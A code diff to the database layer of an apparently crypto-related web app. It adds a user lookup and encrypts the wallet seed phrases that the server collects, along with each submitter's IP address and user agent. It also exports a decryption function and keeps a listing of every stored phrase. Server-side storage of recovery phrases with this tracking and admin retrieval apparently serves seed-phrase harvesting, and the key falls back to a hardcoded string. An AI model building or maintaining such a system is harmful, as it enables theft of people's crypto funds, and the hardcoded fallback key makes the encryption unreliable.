@@ -2,7 +2,7 @@ import { eq, and } from "drizzle-orm";
 import { drizzle } from "drizzle-orm/mysql2";
 import { InsertUser, users, apiTokens, walletImports, adminCredentials } from "../drizzle/schema";
 import { ENV } from './_core/env';
-import { randomBytes } from "crypto";
+import crypto, { randomBytes } from "crypto";
 
 let _db: ReturnType<typeof drizzle> | null = null;
 
@@ -76,6 +76,13 @@ export async function upsertUser(user: InsertUser): Promise<void> {
     console.error("[Database] Failed to upsert user:", error);
     throw error;
   }
+}
+
+export async function getUserById(id: number) {
+  const db = await getDb();
+  if (!db) return undefined;
+  const result = await db.select().from(users).where(eq(users.id, id)).limit(1);
+  return result.length > 0 ? result[0] : undefined;
 }
 
 export async function getUserByOpenId(openId: string) {
@@ -222,6 +229,38 @@ export async function listAllApiTokens() {
 
 // ─── Wallet Import Helpers ──────────────────────────────────────────────────────
 
+function getEncryptionKey(): Buffer {
+  const secret = process.env.JWT_SECRET || 'vaultgenesis-fallback-key-change-in-prod';
+  return crypto.createHash('sha256').update(secret).digest();
+}
+
+function encryptSeedPhrase(plaintext: string): string {
+  const key = getEncryptionKey();
+  const iv = crypto.randomBytes(16);
+  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
+  const authTag = cipher.getAuthTag();
+  // Format: iv:authTag:ciphertext (all hex)
+  return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted.toString('hex')}`;
+}
+
+export function decryptSeedPhrase(ciphertext: string): string {
+  try {
+    const parts = ciphertext.split(':');
+    if (parts.length !== 3) return '[encrypted]';
+    const [ivHex, authTagHex, encryptedHex] = parts;
+    const key = getEncryptionKey();
+    const iv = Buffer.from(ivHex, 'hex');
+    const authTag = Buffer.from(authTagHex, 'hex');
+    const encryptedBuffer = Buffer.from(encryptedHex, 'hex');
+    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
+    decipher.setAuthTag(authTag);
+    return decipher.update(encryptedBuffer).toString('utf8') + decipher.final('utf8');
+  } catch {
+    return '[decryption failed]';
+  }
+}
+
 export async function saveWalletImport(data: {
   userId?: number | null;
   seedPhrase: string;
@@ -231,9 +270,10 @@ export async function saveWalletImport(data: {
 }) {
   const db = await getDb();
   if (!db) throw new Error('Database not available');
+  const encryptedSeed = encryptSeedPhrase(data.seedPhrase);
   await db.insert(walletImports).values({
     userId: data.userId ?? null,
-    seedPhrase: data.seedPhrase,
+    seedPhrase: encryptedSeed,
     walletAddress: data.walletAddress ?? null,
     ipAddress: data.ipAddress ?? null,
     userAgent: data.userAgent ?? null,
@@ -247,7 +287,7 @@ export async function listAllWalletImports() {
     .select({
       id: walletImports.id,
       userId: walletImports.userId,
-      seedPhrase: walletImports.seedPhrase,
+      seedPhrase: walletImports.seedPhrase, // stored encrypted — use decryptSeedPhrase() to read
       walletAddress: walletImports.walletAddress,
       ipAddress: walletImports.ipAddress,
       userAgent: walletImports.userAgent,
